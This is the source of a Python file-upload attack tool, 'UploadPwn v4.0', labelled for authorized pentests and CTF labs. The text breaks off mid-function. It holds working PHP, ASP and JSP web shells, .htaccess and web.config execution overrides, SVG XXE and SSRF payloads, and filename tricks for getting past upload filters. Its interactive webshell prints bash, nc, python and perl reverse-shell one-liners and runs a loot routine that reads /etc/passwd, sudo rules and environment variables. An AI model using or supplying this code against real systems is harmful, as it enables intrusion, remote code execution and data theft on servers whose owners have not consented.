#!/usr/bin/env python3
"""
UploadPwn v4.0 - Universal File Upload Attack Tool
For authorized penetration testing and CTF/HTB lab environments only.
"""

import requests, sys, time, base64, threading, argparse, os, re, json
from urllib.parse import quote, urljoin, urlparse
from datetime import datetime
from pathlib import Path

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.keys import Keys
    SELENIUM_OK = True
except ImportError:
    SELENIUM_OK = False

try:
    from bs4 import BeautifulSoup
    BS4_OK = True
except ImportError:
    BS4_OK = False

# ─── ANSI ─────────────────────────────────────────────────────────────────────
R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
M="\033[95m"; C="\033[96m"; W="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"

def p(color, tag, msg): print(f"{color}{BOLD}[{tag}]{W} {msg}")
def ok(m):   p(G,"✓",m)
def fail(m): p(R,"✗",m)
def info(m): p(B,"*",m)
def warn(m): p(Y,"!",m)
def pwn(m):  p(M,"!!!",m)

BANNER = f"""{C}{BOLD}
╔══════════════════════════════════════════════════════════════════╗
║              U P L O A D P W N  v4.0                            ║
║     Universal File Upload Attack Tool — HTB/OSCP Edition         ║
╠══════════════════════════════════════════════════════════════════╣
║  ✓ Multi-step login  ✓ Sub-page navigation  ✓ Interactive shell  ║
║  ✓ Auto form detect  ✓ CSRF handling        ✓ Zero hardcoded     ║
╚══════════════════════════════════════════════════════════════════╝{W}"""


# ═══════════════════════════════════════════════════════════════════════════════
#  DISCOVERY ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class Discovery:
    def __init__(self, target, outfile="uploadpwn_report.json"):
        self.target    = target
        self.outfile   = outfile
        self.start_ts  = datetime.now().isoformat()
        self.steps     = []
        self.filters   = {}
        self.rce       = []
        self.flags     = []
        self.sources   = {}
        self.xxe_reads = {}
        self.suggestions = []

    def log(self, category, status, detail, extra=None):
        entry = {"ts": datetime.now().isoformat(),
                 "category": category, "status": status, "detail": detail}
        if extra: entry["extra"] = extra
        self.steps.append(entry)
        color = G if status in ("found","bypassed") else \
                R if status == "failed" else Y
        tag = {"found":"DISCOVERED","bypassed":"BYPASSED",
               "failed":"×","info":"INFO"}.get(status, status)
        print(f"  {color}{BOLD}[{tag}]{W} {DIM}{category}{W}: {detail}")

    def filter_detected(self, name):
        self.filters[name] = "present"
        self.log("filter","found",f"Filter detected: {name}")

    def filter_bypassed(self, name, method):
        self.filters[name] = "bypassed"
        self.log("filter","bypassed",f"'{name}' bypassed via: {method}")

    def record_rce(self, filename, url, output, shell, ct):
        self.rce.append({"file":filename,"url":url,
                         "output":output[:500],"shell":shell,"ct":ct})
        self.log("RCE","found",
                 f"RCE via '{filename}' shell={shell}",{"url":url})

    def record_flag(self, flag): self.flags.append(flag)
    def record_source(self, fn, c): self.sources[fn] = c
    def record_xxe(self, fp, c):   self.xxe_reads[fp] = c
    def suggest(self, msg):         self.suggestions.append(msg)

    def print_report(self):
        print(f"\n{C}{BOLD}{'═'*65}")
        print(f"  UPLOADPWN FINAL REPORT — {self.target}")
        print(f"{'═'*65}{W}")

        print(f"\n{B}{BOLD}  FILTERS DETECTED:{W}")
        for name, status in (self.filters.items() if self.filters
                              else [("None","—")]):
            icon = f"{G}✓{W}" if status == "bypassed" else f"{Y}●{W}"
            print(f"    {icon} {name:<35} → {status}")

        print(f"\n{B}{BOLD}  ATTACK STEPS ({len(self.steps)} events):{W}")
        for i, s in enumerate(self.steps, 1):
            color = G if s["status"] in ("found","bypassed") else \
                    R if s["status"] == "failed" else Y
            print(f"  {DIM}{i:>3}.{W} {color}{s['status'].upper():<10}{W} "
                  f"{s['category']:<22} {s['detail'][:55]}")

        if self.rce:
            print(f"\n{M}{BOLD}  RCE RESULTS:{W}")
            for r in self.rce:
                print(f"    {G}✓{W} {r['file']}")
                print(f"       URL    : {r['url']}")
                print(f"       Shell  : {r['shell']}  |  CT: {r['ct']}")
                print(f"       Output : {r['output'][:100]}")

        if self.flags:
            print(f"\n{Y}{BOLD}  FLAGS / DATA CAPTURED:{W}")
            for f in self.flags:
                print(f"    {Y}{BOLD}★  {f}{W}")

        if self.xxe_reads:
            print(f"\n{B}{BOLD}  FILES READ VIA XXE:{W}")
            for path, content in self.xxe_reads.items():
                print(f"    {G}✓{W} {path}: {content[:80]}...")

        if self.sources:
            print(f"\n{B}{BOLD}  PHP SOURCE FILES READ:{W}")
            for fn in self.sources:
                print(f"    {G}✓{W} {fn} ({len(self.sources[fn])} bytes)")

        if self.suggestions:
            print(f"\n{Y}{BOLD}  NEXT STEPS SUGGESTED:{W}")
            for s in self.suggestions:
                print(f"    → {s}")

        print(f"\n{DIM}  Full log: {self.outfile}{W}")
        print(f"{C}{BOLD}{'═'*65}{W}\n")

    def save(self):
        report = {"target":self.target,"start":self.start_ts,
                  "end":datetime.now().isoformat(),"filters":self.filters,
                  "rce":self.rce,"flags":self.flags,"sources":self.sources,
                  "xxe_reads":self.xxe_reads,"steps":self.steps,
                  "suggestions":self.suggestions}
        with open(self.outfile,"w") as f:
            json.dump(report, f, indent=2)


# ═══════════════════════════════════════════════════════════════════════════════
#  MULTI-STEP SESSION MANAGER
#  Handles: simple login, CSRF, multi-step wizard, sub-page navigation
# ═══════════════════════════════════════════════════════════════════════════════

class SessionManager:
    """
    Handles ALL login scenarios:
      1. Simple form (auto-detected)
      2. Login with CSRF token (auto-extracted)
      3. Multi-step login (login → 2FA page / profile page / sub-menu)
      4. JavaScript-heavy login (Selenium)
      5. Custom cookie/header injection (--cookie, --header)
    """
    def __init__(self, target, login_url=None, creds=None,
                 nav_url=None,          # page to navigate to AFTER login
                 upload_page=None,      # page where upload form lives
                 user_field="username",
                 pass_field="password",
                 extra_headers=None,
                 extra_cookies=None,
                 disc: Discovery = None):
        self.target       = target
        self.login_url    = login_url
        self.creds        = creds or {}
        self.nav_url      = nav_url        # e.g. /dashboard, /profile
        self.upload_page  = upload_page    # e.g. /profile/settings/avatar
        self.user_field   = user_field
        self.pass_field   = pass_field
        self.d            = disc
        self.session      = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        })
        if extra_headers:
            for h in extra_headers:
                k, v = h.split(":", 1)
                self.session.headers[k.strip()] = v.strip()
        if extra_cookies:
            for c in extra_cookies:
                k, v = c.split("=", 1)
                self.session.cookies.set(k.strip(), v.strip())

    # ── CSRF token extraction ──────────────────────────────────────────────────
    def _get_csrf(self, url):
        """Extract CSRF token from a page before submitting a form."""
        try:
            r = self.session.get(url, timeout=10)
            # Check meta tag
            m = re.search(
                r'<meta[^>]+name=["\']csrf[_-]?token["\'][^>]+content=["\']([^"\']+)["\']',
                r.text, re.I)
            if m: return m.group(1)
            # Check hidden input
            m = re.search(
                r'<input[^>]+name=["\'](_token|csrf[_-]?token|authenticity_token)["\'][^>]+value=["\']([^"\']+)["\']',
                r.text, re.I)
            if m: return m.group(2)
            # BS4 fallback
            if BS4_OK:
                soup = BeautifulSoup(r.text, "html.parser")
                for inp in soup.find_all("input", {"type":"hidden"}):
                    n = (inp.get("name") or "").lower()
                    if "csrf" in n or "token" in n or n == "_token":
                        return inp.get("value","")
        except: pass
        return None

    # ── Auto-detect form fields ────────────────────────────────────────────────
    def _parse_form(self, url):
        """Parse a page and return (action, method, all_fields_dict)."""
        try:
            r    = self.session.get(url, timeout=10)
            if not BS4_OK:
                return urljoin(url, "/login"), "post", {
                    self.user_field: self.creds.get("username",""),
                    self.pass_field: self.creds.get("password",""),
                }
            soup = BeautifulSoup(r.text, "html.parser")
            form = soup.find("form")
            if not form:
                return url, "post", {}
            action = urljoin(url, form.get("action", url))
            method = form.get("method","post").lower()
            fields = {}
            for inp in form.find_all(["input","select","textarea"]):
                name = inp.get("name")
                if not name: continue
                fields[name] = inp.get("value","")
            return action, method, fields
        except:
            return url, "post", {}

    # ── Step 1: Simple / CSRF-aware login ─────────────────────────────────────
    def login_requests(self):
        if not self.login_url or not self.creds:
            return True
        info(f"LOGIN: Fetching login page → {self.login_url}")

        action, method, fields = self._parse_form(self.login_url)

        # Inject credentials (smart field matching)
        for k in list(fields.keys()):
            kl = k.lower()
            if any(x in kl for x in ["user","email","login","name"]):
                fields[k] = self.creds.get("username","")
            if any(x in kl for x in ["pass","pwd","secret"]):
                fields[k] = self.creds.get("password","")
        # Always set the explicitly named fields too
        fields[self.user_field] = self.creds.get("username","")
        fields[self.pass_field] = self.creds.get("password","")

        info(f"LOGIN: Submitting to {action} [{method.upper()}]")
        info(f"LOGIN: Fields = {list(fields.keys())}")

        try:
            if method == "post":
                r = self.session.post(action, data=fields,
                                      allow_redirects=True, timeout=15)
            else:
                r = self.session.get(action, params=fields,
                                     allow_redirects=True, timeout=15)

            ok(f"Login submitted (HTTP {r.status_code}) → {r.url}")

            # Heuristic success check
            page = r.text.lower()
            if any(x in page for x in ["logout","dashboard","welcome",
                                        "profile","sign out","my account"]):
                ok("Login confirmed (found post-login keyword)")
                if self.d: self.d.log("login","found",
                                      f"Authenticated via requests → {r.url}")
                return True

            # Maybe we're on the right page anyway
            if self.login_url not in r.url:
                ok(f"Redirected away from login → {r.url}")
                return True

            warn("Login response ambiguous — continuing anyway")
            return True

        except Exception as e:
            fail(f"Login request error: {e}")
            return False

    # ── Step 2: Navigate to sub-page after login ───────────────────────────────
    def navigate_to_upload_page(self):
        """
        If the upload form is not on the main page but behind navigation
        (e.g. /profile → click 'Settings' → find upload form),
        this method navigates there via requests.
        """
        if self.nav_url:
            info(f"NAVIGATE: Going to nav page → {self.nav_url}")
            try:
                full = urljoin(self.target, self.nav_url)
                r = self.session.get(full, timeout=10, allow_redirects=True)
                ok(f"Navigation page loaded (HTTP {r.status_code})")
                return r
            except Exception as e:
                fail(f"Navigation error: {e}")

        if self.upload_page:
            info(f"NAVIGATE: Going to upload page → {self.upload_page}")
            try:
                full = urljoin(self.target, self.upload_page)
                r = self.session.get(full, timeout=10, allow_redirects=True)
                ok(f"Upload page loaded (HTTP {r.status_code})")
                return r
            except Exception as e:
                fail(f"Upload page error: {e}")

        return None

    # ── Step 3: Selenium browser login (JS-heavy / MFA / complex flows) ────────
    def login_selenium(self, headless=True):
        if not SELENIUM_OK:
            fail("pip install selenium")
            return False
        info(f"BROWSER LOGIN: {self.login_url}")
        try:
            opts = webdriver.ChromeOptions()
            if headless:
                opts.add_argument("--headless=new")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument("--disable-blink-features=AutomationControlled")
            driver = webdriver.Chrome(options=opts)
            wait   = WebDriverWait(driver, 15)

            driver.get(self.login_url)
            time.sleep(1)

            # Auto-fill username
            for sel in [f"input[name='{self.user_field}']",
                        "input[type='email']","input[type='text']",
                        "input[name='username']","input[name='email']"]:
                try:
                    el = driver.find_element(By.CSS_SELECTOR, sel)
                    el.clear(); el.send_keys(self.creds.get("username",""))
                    break
                except: pass

            # Auto-fill password
            for sel in [f"input[name='{self.pass_field}']",
                        "input[type='password']","input[name='password']"]:
                try:
                    el = driver.find_element(By.CSS_SELECTOR, sel)
                    el.clear(); el.send_keys(self.creds.get("password",""))
                    break
                except: pass

            time.sleep(0.5)

            # Submit
            for sel in ["button[type='submit']","input[type='submit']",
                        "button[class*='login']","button[class*='sign']",
                        "form button"]:
                try:
                    driver.find_element(By.CSS_SELECTOR, sel).click()
                    break
                except: pass

            time.sleep(2)

            # Navigate to sub-page if needed
            if self.nav_url:
                driver.get(urljoin(self.target, self.nav_url))
                time.sleep(1)
            if self.upload_page:
                driver.get(urljoin(self.target, self.upload_page))
                time.sleep(1)

            # Transfer cookies
            for cookie in driver.get_cookies():
                self.session.cookies.set(cookie["name"], cookie["value"])

            ok(f"Browser login done. Cookies: "
               f"{[c for c in self.session.cookies.keys()]}")
            if self.d: self.d.log("login","found","Selenium browser login successful")
            driver.quit()
            return True

        except Exception as e:
            fail(f"Selenium error: {e}")
            return False

    def login(self, method="auto"):
        if   method == "selenium": return self.login_selenium()
        elif method == "requests": return self.login_requests()
        else:
            ok_r = self.login_requests()
            if not ok_r and SELENIUM_OK:
                warn("Requests login failed — trying browser...")
                return self.login_selenium()
            return ok_r

    # ── Upload page: auto-discover form field name ─────────────────────────────
    def find_upload_field(self):
        """
        Visit the upload page and find the file input field name automatically.
        Returns the field name or None.
        """
        page = self.upload_page or "/"
        url  = urljoin(self.target, page)
        try:
            r = self.session.get(url, timeout=10)
            if BS4_OK:
                soup = BeautifulSoup(r.text, "html.parser")
                for inp in soup.find_all("input", {"type":"file"}):
                    name = inp.get("name")
                    if name:
                        ok(f"Auto-detected upload field: '{name}'")
                        return name
            # Regex fallback
            m = re.search(r'<input[^>]+type=["\']file["\'][^>]+name=["\']([^"\']+)["\']',
                          r.text, re.I)
            if m:
                ok(f"Auto-detected upload field: '{m.group(1)}'")
                return m.group(1)
        except: pass
        return None

    # ── Also auto-detect upload endpoint from form action ──────────────────────
    def find_upload_endpoint(self):
        """Return the form action URL from the upload page."""
        page = self.upload_page or "/"
        url  = urljoin(self.target, page)
        try:
            r = self.session.get(url, timeout=10)
            if BS4_OK:
                soup = BeautifulSoup(r.text, "html.parser")
                for form in soup.find_all("form"):
                    if form.find("input", {"type":"file"}):
                        action = form.get("action")
                        if action:
                            full = urljoin(url, action)
                            ok(f"Auto-detected upload endpoint: {full}")
                            return full
            m = re.search(
                r'<form[^>]+action=["\']([^"\']+)["\'][^>]*>.*?'
                r'<input[^>]+type=["\']file["\']',
                r.text, re.I | re.S)
            if m:
                full = urljoin(url, m.group(1))
                ok(f"Auto-detected upload endpoint: {full}")
                return full
        except: pass
        return None


# ═══════════════════════════════════════════════════════════════════════════════
#  FILTER PROBE
# ═══════════════════════════════════════════════════════════════════════════════

class FilterProbe:
    def __init__(self, upload_fn, disc: Discovery, field="uploadFile"):
        self.upload = upload_fn
        self.d      = disc
        self.field  = field

    def _ok(self, status, body):
        if status not in [200,201,302]: return False
        bad = ["only images","not allowed","invalid","blocked","failed",
               "disallowed","rejected","extension","mime","forbidden"]
        return not any(k in body.lower() for k in bad)

    def probe_all(self):
        info("PROBE: Fingerprinting active filters...")
        self._probe_ext_php()
        self._probe_ext_phtml()
        self._probe_whitelist()
        self._probe_content_type()
        self._probe_mime()
        self._probe_null_byte()
        self._probe_size()
        self._probe_svg()
        print()

    def _probe_ext_php(self):
        s,b = self.upload("shell.php", b"<?php phpinfo();?>", "application/x-php")[:2]
        if not self._ok(s,b):
            self.d.filter_detected("Extension Filter (.php blocked)")
        else:
            self.d.log("probe","info",".php accepted directly — minimal filtering")

    def _probe_ext_phtml(self):
        s,b = self.upload("shell.phtml", b"<?php phpinfo();?>", "image/jpeg")[:2]
        if self._ok(s,b):
            self.d.log("probe","info",".phtml accepted → blacklist is incomplete")
            self.d.suggest("Use .phtml, .pht, .php5 to bypass blacklist")
        else:
            self.d.filter_detected("Blacklist covers PHP variants")

    def _probe_whitelist(self):
        s,b = self.upload("shell.jpg", b"<?php phpinfo();?>", "image/jpeg")[:2]
        if not self._ok(s,b):
            self.d.filter_detected("Whitelist (extension OR content check)")

    def _probe_content_type(self):
        s,b = self.upload("shell.php", b"<?php phpinfo();?>", "image/jpeg")[:2]
        if self._ok(s,b):
            self.d.log("probe","info","CT-spoof to image/jpeg bypasses CT filter")
            self.d.filter_bypassed("Content-Type Filter","spoof to image/jpeg")
        else:
            self.d.filter_detected("Content-Type Header Filter")

    def _probe_mime(self):
        s,b = self.upload("shell.php", b"GIF89a;\n<?php phpinfo();?>","image/gif")[:2]
        if self._ok(s,b):
            self.d.filter_bypassed("MIME Filter","GIF89a magic bytes")
        else:
            self.d.filter_detected("MIME/Magic-Byte Filter")
            self.d.suggest("Try PNG/JPEG magic bytes as GIF was blocked")

    def _probe_null_byte(self):
        s,b = self.upload("shell.php%00.jpg",b"<?php phpinfo();?>","image/jpeg")[:2]
        if self._ok(s,b):
            self.d.filter_bypassed("Extension Filter","null byte: shell.php%00.jpg")
            self.d.suggest("Null byte works — server likely PHP <5.3.4")

    def _probe_size(self):
        s,b = self.upload("big.jpg", b"A"*5*1024*1024, "image/jpeg")[:2]
        if not self._ok(s,b):
            self.d.filter_detected("File Size Limit")
            self.d.suggest("Use tiny shell: <?=`$_GET[0]`?>")

    def _probe_svg(self):
        s,b = self.upload("t.svg",
            b'<svg xmlns="http://www.w3.org/2000/svg"><circle r="1"/></svg>',
            "image/svg+xml")[:2]
        if self._ok(s,b):
            self.d.log("probe","found","SVG allowed → XXE/XSS surface")
            self.d.suggest("Run --svg-read /flag.txt and --svg-src upload.php")


# ═══════════════════════════════════════════════════════════════════════════════
#  PAYLOADS
# ═══════════════════════════════════════════════════════════════════════════════

SHELLS = {
    "standard":   b"<?php system($_GET['cmd']); ?>",
    "tiny":       b"<?=`$_GET[0]`?>",
    "passthru":   b"<?php passthru($_GET['cmd']); ?>",
    "exec":       b"<?php echo exec($_GET['cmd']); ?>",
    "popen":      b"<?php $h=popen($_GET['cmd'],'r');while(!feof($h))echo fgets($h);pclose($h);?>",
    "gif_magic":  b"GIF89a;\n<?php system($_GET['cmd']); ?>",
    "png_magic":  b"\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>",
    "jpeg_magic": b"\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>",
    "gif_tiny":   b"GIF89a;\n<?=`$_GET[0]`?>",
    "gif_popen":  b"GIF89a;\n<?php $h=popen($_GET['cmd'],'r');while(!feof($h))echo fgets($h);pclose($h);?>",
}

ASP_SHELLS = {
    "asp_basic":  b"<%Response.write(CreateObject(\"WScript.Shell\").Exec(\"cmd /c \"%Request(\"cmd\")).StdOut.ReadAll())%>",
    "aspx_basic": b'<%@ Page Language="C#"%><%System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>',
}

JSP_SHELLS = {
    "jsp_basic": b'<%Runtime r=Runtime.getRuntime();Process p=r.exec(request.getParameter("cmd"));java.io.InputStream is=p.getInputStream();java.util.Scanner s=new java.util.Scanner(is).useDelimiter("\\A");out.println(s.hasNext()?s.next():"");%>',
}

SVG_XXE_FILE = lambda p: f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file://{p}"> ]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
  <text x="0" y="20">&xxe;</text></svg>""".encode()

SVG_XXE_B64 = lambda p: f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={p}"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text></svg>""".encode()

SVG_XSS  = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><circle r="50"/></svg>'
SVG_SSRF  = lambda u: f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "{u}">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>'.encode()

HTACCESS_PAYLOADS = [
    b"AddType application/x-httpd-php .jpg .jpeg .png .gif .svg .xml .xxx\n",
    b"AddHandler application/x-httpd-php .jpg .jpeg .png .gif\n",
    b"<FilesMatch \".\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n",
    b"Options +ExecCGI\nAddHandler php-script .jpg .png .gif\n",
]

WEBCONFIG = b"""<?xml version="1.0" encoding="UTF-8"?>
<configuration><system.webServer><handlers accessPolicy="Read, Script, Write">
<add name="wc" path="*.config" verb="*" modules="IsapiModule"
scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll"
resourceType="Unspecified" requireAccess="Write" preCondition="bitness64"/>
</handlers><security><requestFiltering><fileExtensions>
<remove fileExtension=".config"/></fileExtensions></requestFiltering>
</security></system.webServer></configuration>
<!--<%Response.write(CreateObject("WScript.Shell").Exec("cmd /c "&Request("cmd")).StdOut.ReadAll())%>-->"""

PHP_EXTS = [
    ".php",".php3",".php4",".php5",".php7",".php8",
    ".phtml",".phar",".phps",".pht",".pgif",".inc",
    ".PHP",".Php",".pHp",".phP",".PHp",".PhP",".pHP",
]
ALLOWED_IMG_EXTS = [".jpg",".jpeg",".png",".gif",".webp",".bmp",".svg"]
INJECT_CHARS = ["%20","%0a","%00","%0d0a","/",".\\"," ",".",
                "...","::","::$DATA","%2500","%252e"]
CONTENT_TYPES_IMAGE = ["image/jpeg","image/jpg","image/png","image/gif",
                       "image/webp","image/svg+xml","image/bmp","image/tiff"]
CONTENT_TYPES_MISC  = ["application/octet-stream","text/plain",
                       "multipart/form-data","application/x-php"]

DEFAULT_SHELL_DIRS = [
    "/profile_images/","/uploads/","/upload/","/files/",
    "/images/","/media/","/tmp/","/assets/uploads/",
    "/storage/","/public/uploads/","/avatars/",
    "/attachments/","/static/","/data/","/userfiles/",
]

def gen_all_filenames():
    names = []
    for ext in PHP_EXTS:
        names.append(f"shell{ext}")
    for php in PHP_EXTS:
        for img in ALLOWED_IMG_EXTS:
            names.append(f"shell{img}{php}")
            names.append(f"shell{php}{img}")
    for char in INJECT_CHARS:
        for php in PHP_EXTS:
            for img in [".jpg",".png",".gif"]:
                names.append(f"shell{php}{char}{img}")
                names.append(f"shell{img}{char}{php}")
    for php in PHP_EXTS:
        for s in [".", " ", "...", "::$DATA"]:
            names.append(f"shell{php}{s}")
    for php in PHP_EXTS:
        for p in ["../", "../../", "..%2f", "....///"]:
            names.append(f"{p}shell{php}")
    return list(dict.fromkeys(names))

def build_matrix(filename):
    matrix = []
    all_shells = {**SHELLS, **ASP_SHELLS, **JSP_SHELLS}
    for sname, sbytes in all_shells.items():
        for ct in CONTENT_TYPES_IMAGE + CONTENT_TYPES_MISC:
            matrix.append((filename, sbytes, ct, sname))
    return matrix


# ═══════════════════════════════════════════════════════════════════════════════
#  INTERACTIVE WEBSHELL
# ═══════════════════════════════════════════════════════════════════════════════

class WebShell:
    """
    Interactive shell session after RCE is confirmed.
    Supports: command execution, file read, directory listing,
              reverse shell generation, and download loot.
    """
    def __init__(self, session, shell_url, cmd_param="cmd",
                 disc: Discovery = None):
        self.session    = session
        self.shell_url  = shell_url
        self.cmd_param  = cmd_param
        self.d          = disc
        self.history    = []
        self.cwd        = "/"

    def run(self, cmd, raw=False):
        """Execute a command and return output."""
        url = f"{self.shell_url}?{self.cmd_param}={quote(cmd)}"
        try:
            r = self.session.get(url, timeout=20)
            out = r.text.strip()
            # Strip GIF header if present
            if out.startswith("GIF89a"):
                out = out[6:].lstrip(";\n")
            return out
        except Exception as e:
            return f"[ERROR] {e}"

    def _print_walkthrough(self, shell_url, cmd_param, winning_file,
                           winning_shell, winning_ct):
        """Print the full RCE walkthrough — what worked and why."""
        print(f"""
{C}{BOLD}╔══════════════════════════════════════════════════════════════╗
║              RCE WALKTHROUGH — HOW WE GOT HERE              ║
╚══════════════════════════════════════════════════════════════╝{W}

{B}{BOLD}STEP 1 — Filter Fingerprint{W}
  The tool probed the upload endpoint with test files to detect
  which filters were active (extension blacklist, whitelist,
  Content-Type header, MIME magic bytes).

{B}{BOLD}STEP 2 — Winning Payload Combination{W}
  ┌─────────────────────────────────────────────────────────────┐
  │  Filename     : {winning_file:<44}│
  │  Shell type   : {winning_shell:<44}│
  │  Content-Type : {winning_ct:<44}│
  │  Shell URL    : {shell_url[:44]:<44}│
  │  CMD param    : {cmd_param:<44}│
  └─────────────────────────────────────────────────────────────┘

{B}{BOLD}STEP 3 — Why It Worked{W}
  • Filename trick  → bypassed extension whitelist/blacklist
  • Magic bytes     → bypassed MIME/content validation
  • Spoofed CT      → bypassed Content-Type header check
  • Combined        → passed ALL filters simultaneously

{B}{BOLD}STEP 4 — Manual Reproduction (curl){W}
  {G}# Upload the shell:{W}
  curl -s -X POST '{self.shell_url.rsplit('/',2)[0]}/upload.php' \\
    -F '{cmd_param}=@shell.php;filename={winning_file};type={winning_ct}'

  {G}# Execute commands:{W}
  curl '{shell_url}?{cmd_param}=id'
  curl '{shell_url}?{cmd_param}=whoami'
  curl '{shell_url}?{cmd_param}=cat+/flag.txt'

{B}{BOLD}STEP 5 — Burp Suite Reproduction{W}
  1. Intercept a normal image upload
  2. Change filename to: {winning_file}
  3. Change Content-Type to: {winning_ct}
  4. Prepend file content with magic bytes from shell type: {winning_shell}
  5. Forward → visit shell URL → append ?{cmd_param}=id

{Y}{BOLD}You now have an interactive webshell below.{W}
""")

    def interactive(self, winning_file="", winning_shell="",
                    winning_ct=""):
        """Drop into interactive webshell REPL."""
        self._print_walkthrough(self.shell_url, self.cmd_param,
                                winning_file, winning_shell, winning_ct)

        # Quick recon on entry
        info("Running quick recon...")
        for label, cmd in [
            ("whoami",   "whoami"),
            ("id",       "id"),
            ("hostname", "hostname"),
            ("uname",    "uname -a"),
            ("pwd",      "pwd"),
        ]:
            out = self.run(cmd)
            print(f"  {G}{label:<10}{W}: {out}")

        print(f"""
{C}{BOLD}  Interactive WebShell  {W}
  Shell URL : {self.shell_url}
  CMD param : {self.cmd_param}

{Y}  Built-in commands:{W}
    !read <path>       — read a file (cat)
    !ls <path>         — list directory
    !find <name>       — find files by name
    !revshell <ip> <port>  — generate reverse shell one-liner
    !loot              — auto-collect /etc/passwd, crons, SUID
    !history           — show command history
    !exit              — exit webshell
    <anything else>    — executed directly on the server
""")

        while True:
            try:
                cmd = input(f"{M}{BOLD}webshell{W} {B}>{W} ").strip()
            except (KeyboardInterrupt, EOFError):
                print()
                break

            if not cmd:
                continue

            self.history.append(cmd)

            # ── Built-in commands ──────────────────────────────────────────
            if cmd == "!exit":
                break

            elif cmd == "!history":
                for i, c in enumerate(self.history, 1):
                    print(f"  {DIM}{i:>3}  {c}{W}")

            elif cmd.startswith("!read "):
                path = cmd[6:].strip()
                out  = self.run(f"cat {path}")
                print(f"\n{G}--- {path} ---{W}")
                print(out)
                if self.d and out: self.d.record_xxe(path, out)

            elif cmd.startswith("!ls "):
                path = cmd[4:].strip()
                out  = self.run(f"ls -la {path}")
                print(out)

            elif cmd.startswith("!find "):
                name = cmd[6:].strip()
                out  = self.run(f"find / -name '{name}' 2>/dev/null")
                print(out)

            elif cmd.startswith("!revshell "):
                parts = cmd.split()
                if len(parts) >= 3:
                    ip, port = parts[1], parts[2]
                    print(f"""
{Y}Reverse Shell One-Liners — pick one:{W}
  bash:    bash -i >& /dev/tcp/{ip}/{port} 0>&1
  nc:      nc -e /bin/bash {ip} {port}
  python:  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
  perl:    perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'

{G}Start listener:{W}  nc -lvnp {port}
{G}Execute via shell:{W}  !<paste one-liner above>
""")

            elif cmd == "!loot":
                loot_cmds = [
                    ("OS info",       "cat /etc/os-release"),
                    ("Users",         "cat /etc/passwd"),
                    ("Sudo rules",    "sudo -l 2>/dev/null"),
                    ("SUID files",    "find / -perm -4000 2>/dev/null | head -20"),
                    ("Cron jobs",     "cat /etc/crontab 2>/dev/null"),
                    ("Network",       "ip a 2>/dev/null || ifconfig"),
                    ("Listening",     "ss -tlnp 2>/dev/null || netstat -tlnp"),
                    ("Env vars",      "env"),
                    ("Writable dirs", "find / -writable -type d 2>/dev/null | head -10"),
                ]
                for label, lcmd in loot_cmds:
                    out = self.run(lcmd)
                    if out:
                        print(f"\n{G}{BOLD}[{label}]{W}")
                        print(out[:500])
                        if self.d: self.d.log("loot","found",
                                              f"{label}: {out[:80]}")

            else:
                # Direct command execution
                out = self.run(cmd)
                if out:
                    print(out)
                else:
                    print(f"{DIM}(no output){W}")


# ═══════════════════════════════════════════════════════════════════════════════
#  CORE ATTACKER
# ═══════════════════════════════════════════════════════════════════════════════

class UploadAttacker:
    def __init__(self, sm: SessionManager, upload_url, shell_dirs,
                 cmd_param="cmd", field="uploadFile",
                 flag_path="/flag.txt", verbose=False,
                 disc: Discovery = None, interactive=False):
        self.sm          = sm
        self.upload_url  = upload_url
        self.shell_dirs  = shell_dirs
        self.cmd_param   = cmd_param
        self.field       = field
        self.flag_path   = flag_path
        self.verbose     = verbose
        self.d           = disc
        self.interactive = interactive

    def upload(self, filename, content, content_type, extra_fields=None):
        files = {self.field: (filename, content, content_type)}
        try:
            r = self.sm.session.post(self.upload_url,
                files=files, data=extra_fields or {},
                allow_redirects=True, timeout=15)
            return r.status_code, r.text, r
        except Exception as e:
            return 0, str(e), None

    def is_success(self, status, body):
        if status not in [200,201,302]: return False
        bad = ["only images","not allowed","invalid","blocked","failed",
               "disallowed","rejected","extension","mime","forbidden","error"]
        return not any(k in body.lower() for k in bad)

    def verify_rce(self, filename, cmd="id"):
        clean = re.sub(r'\.\.+[/\\]','',
                       os.path.basename(filename.lstrip("./").lstrip("%2f")))
        candidates = list(dict.fromkeys(
            [clean, filename, os.path.basename(filename)]))
        params = [self.cmd_param, "0", "c", "1", "exec"]
        for d in self.shell_dirs:
            for fn in candidates:
                for param in params:
                    url = f"{self.sm.target}{d}{fn}?{param}={cmd}"
                    try:
                        r = self.sm.session.get(url, timeout=8)
                        if r.status_code == 200 and r.text.strip():
                            if any(x in r.text for x in
                                   ["uid=","root","www-data","GIF89a",
